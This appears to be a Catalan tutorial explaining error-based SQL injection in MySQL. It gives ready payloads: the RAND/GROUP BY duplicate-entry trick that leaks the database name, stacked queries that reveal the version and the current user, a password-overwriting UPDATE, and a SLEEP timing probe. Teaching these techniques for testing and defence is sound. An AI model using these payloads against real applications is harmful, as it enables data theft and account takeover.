# **SQL Injection Error-Based i Double Query Injection**

## **1️⃣ SQL Injection Error-Based**
L’**Error-Based SQL Injection** és una tècnica d’atac que aprofita els missatges d’error generats per la base de dades per obtenir informació sensible.

### **📌 Payload d’exemple (MySQL)**
```sql
SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT DATABASE()),FLOOR(RAND()*2)) a 
FROM information_schema.tables GROUP BY a)b;
```

### **🛠 Explicació pas a pas**
1. **`SELECT DATABASE()`** → Retorna el nom de la base de dades actual.
2. **`RAND()*2`** → Genera un número aleatori entre 0 i 2.
3. **`FLOOR(RAND()*2)`** → Arrodoneix aquest número a 0 o 1.
4. **`CONCAT((SELECT DATABASE()), FLOOR(RAND()*2))`** → Uneix el nom de la base de dades amb el número aleatori.
5. **`COUNT(*)`** → Compta les files de `information_schema.tables` (on es guarden les metadades de totes les taules).
6. **`GROUP BY a`** → Provoca un error perquè `RAND()` pot generar el mateix número per diferents files, causant un **error de duplicat**.
7. **`SELECT 1 FROM (...) b`** → Força l’execució de la consulta dins d’una subconsulta.

### **⚠️ Error generat**
```
ERROR 1062 (23000): Duplicate entry 'dbname1' for key 1
```
📢 **Aquest error revela el nom de la base de dades!** Això permet a l’atacant obtenir informació crítica sense necessitar accés directe a les dades.

---

## **2️⃣ Double Query Injection (2a consulta per obtenir informació)**
### **🔍 Què és?**
El **Double Query Injection** és una tècnica avançada que aprofita la segona consulta en una injecció per obtenir informació de la base de dades.

🛑 **El principi clau:**  
En moltes aplicacions, si una consulta retorna un error però la segona s’executa, l’atacant pot aprofitar aquest comportament per obtenir dades.

---

### **📌 Exemple de Double Query Injection**
#### **Cas 1: Provocant un error a la primera consulta i obtenint dades a la segona**
```sql
SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND()*2))a FROM information_schema.tables GROUP BY a)b; 
SELECT @@version;
```
**Explicació:**
1️⃣ **Primera consulta:** Genera un error de "Duplicate entry", que no impedeix que es processi la segona consulta.  
2️⃣ **Segona consulta:** Retorna la versió del servidor MySQL (`@@version`), exposant informació crítica.

---

#### **Cas 2: Amb `UPDATE` o `INSERT`**
Si una aplicació permet modificar dades, es pot injectar una segona consulta per extreure informació:

```sql
UPDATE users SET password='newpass' WHERE id=1; SELECT user();
```
📢 **Si l’aplicació és vulnerable**, aquesta segona consulta (`SELECT user();`) es pot executar i mostrar l’usuari connectat.

---

#### **Cas 3: Exploiting `SLEEP()` per comprovar vulnerabilitat**
```sql
1; SELECT SLEEP(5);
```
📌 Si el servidor triga **5 segons a respondre**, vol dir que la injecció ha tingut èxit! Això confirma que l’aplicació és vulnerable.

---